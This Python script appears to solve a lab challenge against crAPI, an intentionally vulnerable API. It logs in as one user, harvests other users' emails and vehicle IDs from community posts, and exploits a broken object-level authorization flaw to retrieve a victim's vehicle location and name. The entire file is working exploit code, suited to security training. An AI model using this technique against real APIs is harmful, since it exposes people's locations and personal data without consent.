#!/usr/bin/env python3
"""Challenge 1: Access details of another user's vehicle (BOLA)"""
import argparse, sys, time, random
from pathlib import Path
from typing import Optional, List, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    url = f"{base_url.rstrip('/')}/identity/api/auth/login"
    try:
        r = requests.post(url, json={"email": email, "password": password}, timeout=timeout)
        r.raise_for_status()
        data = r.json()
        return data.get("token") or data.get("access_token")
    except:
        return None

def get_recent_posts(base_url: str, token: str, timeout: float = 15, retries: int = 3) -> List[Dict[str, Any]]:
    url = f"{base_url.rstrip('/')}/community/api/v2/community/posts/recent"
    headers = {"Authorization": f"Bearer {token}"}
    all_posts = []
    for attempt in range(retries):
        try:
            limit = 500
            offset = 0
            while True:
                r = requests.get(url, headers=headers, params={"limit": limit, "offset": offset}, timeout=timeout)
                r.raise_for_status()
                posts = r.json().get("posts") or []
                if not posts:
                    break
                all_posts.extend(posts)
                if len(posts) < limit:
                    break
                offset += limit
            return all_posts if all_posts else []
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(1)
                continue
            return all_posts
    return all_posts

def get_own_vehicles(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    url = f"{base_url.rstrip('/')}/identity/api/v2/vehicle/vehicles"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=timeout).json()
        return r if isinstance(r, list) else r.get("vehicles") or []
    except:
        return []

def get_vehicle_location(base_url: str, token: str, vehicle_id: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
    url = f"{base_url.rstrip('/')}/identity/api/v2/vehicle/{vehicle_id}/location"
    headers = {"Authorization": f"Bearer {token}"}
    try:
        return requests.get(url, headers=headers, timeout=timeout).json()
    except:
        return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 1: BOLA on Vehicle Location")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--attacker-email", default="mike1@my.lab")
    parser.add_argument("--victim-email")
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 1: BOLA on Vehicle Location\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.attacker_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")
    time.sleep(0.5)

    posts = get_recent_posts(base_url, token)
    if not posts:
        print("[!] Failed to retrieve posts"); sys.exit(1)
    print(f"[*] Retrieved {len(posts)} posts")

    victims = {}
    for post in posts:
        author = post.get("author") or {}
        email = author.get("email", "")
        vehicleid = author.get("vehicleid")
        if email and email != args.attacker_email and vehicleid:
            victims[email] = vehicleid

    if not victims:
        print(f"[!] No victim candidates found (checked {len(posts)} posts)"); sys.exit(1)
    print(f"[+] Found {len(victims)} possible victims")

    if not victims:
        print(f"[!] No victims found in {len(posts)} posts"); sys.exit(1)

    victim_email = args.victim_email if args.victim_email else random.choice(list(victims.keys()))
    victim_vehicle_id = victims.get(victim_email)
    if not victim_vehicle_id:
        print(f"[!] Victim {victim_email} not found in victims dict")
        print(f"[!] Available victims: {list(victims.keys())[:5]}...")
        sys.exit(1)
    print(f"[+] Target victim: {victim_email}")
    print(f"[+] Found victim's vehicleId: {victim_vehicle_id}")

    print(f"[!] BOLA: Accessing victim's location...")
    victim_loc = get_vehicle_location(base_url, token, victim_vehicle_id)
    if victim_loc:
        vl = victim_loc.get("vehicleLocation", {})
        print(f"[+] SUCCESS! Location: lat={vl.get('latitude')}, lon={vl.get('longitude')}")
        print(f"[+] Name: {vl.get('fullName')}")
        print(f"[!] VULNERABLE: Accessed another user's vehicle location")

if __name__ == "__main__":
    main()
